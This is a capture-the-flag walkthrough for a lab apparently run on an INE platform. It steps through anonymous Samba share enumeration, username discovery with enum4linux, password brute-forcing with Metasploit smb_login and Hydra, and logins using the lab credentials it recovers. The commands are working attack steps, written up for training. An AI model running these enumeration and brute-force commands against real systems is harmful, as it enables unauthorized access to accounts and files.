# Flag 1
There is a samba share that allows anonymous access. Wonder what's in there!

- Since the shares.txt was provided, create a custom script and enumerate the shares
```basg
for share in $(cat /root/Desktop/wordlistshares.txt); do
    echo "[*] Testing $share"
    smbclient //target/$share -N -c 'ls' 2>/dev/null && echo "[+] SUCCESS: $share"
done
```

- Login with the found shares
```
smbclient //target.ine.local\\pubfiles -U anonymous
get flag1.txt
```
# Flag 2
One of the samba users have a bad password. Their private share with the same name as their username is at risk!

- Using enum4linux to get the SMB usernames
```
enum4linx -a target.ine.local
```

- Save the usernames in a file
```
nano users.txt
```

- Using Msfconsole:
```
search smb_login
set RHOSTS target.ine.local
set USER_FILE users.txt
set PASS_FILE unix_passwords.txt
run
```

- Login with the found users and password

```
smbclient //target.ine.local/josh -U josh
	purple
get flag2.txt
```

`HINT:`Psst! I heard there is an FTP service running. Find it and check the banner.
# Flag 3
Follow the hint given in the previous flag to uncover this one.
```
nmap -sV --script=banner -p 5554 target.ine.local
```
```
hydra -L /root/users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 5554 target.ine.local ftp
```
```
ftp -p target.ine.local 5554
	alice
	pretty
ls
```
# Flag 4
This is a warning meant to deter unauthorized users from logging in.
```
ssh target.ine.local
```